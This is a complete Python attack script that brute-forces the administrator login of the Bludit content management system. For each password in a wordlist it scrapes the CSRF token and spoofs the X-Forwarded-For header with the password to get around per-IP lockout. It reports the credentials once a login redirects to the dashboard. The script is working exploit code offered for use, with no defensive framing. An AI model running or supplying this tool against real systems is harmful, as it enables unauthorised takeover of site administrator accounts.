import re
import requests
import sys

if len(sys.argv) != 5:
    print("Use mode: python3 bludit_brute_force.py 127.0.0.1 /admin/login admin wordlist.txt")

else:
    try:
        host = sys.argv[1]
        login_url = host + sys.argv[2]
        username = sys.argv[3]
        file = sys.argv[4]

        # Getting wordlist
        with open(file, "r") as f:
            wordlist = f.readlines()

        for password in wordlist:
            session = requests.Session()
            login_page = session.get(login_url)
            csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

            print('[*] Trying: {p}'.format(p = password.strip("\n")))

            headers = {
                'X-Forwarded-For': password.strip("\n"),
                'User-Agent': """Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) 
                Chrome/77.0.3865.90 Safari/537.36""",
                'Referer': login_url
            }

            data = {
                'tokenCSRF': csrf_token,
                'username': username,
                'password': password.strip("\n"),
                'save': ''
            }

            login_result = session.post(login_url, headers=headers, data=data, allow_redirects=False)

            if 'location' in login_result.headers:
                if '/admin/dashboard' in login_result.headers['location']:
                    print('SUCCESS: Password found!')
                    print('Use {u}:{p} to login.'.format(u = username, p = password.strip("\n")))
                    break
    except IndexError:
        print("Use mode: python3 bludit_brute_force.py 127.0.0.1 /admin/login admin wordlist.txt")
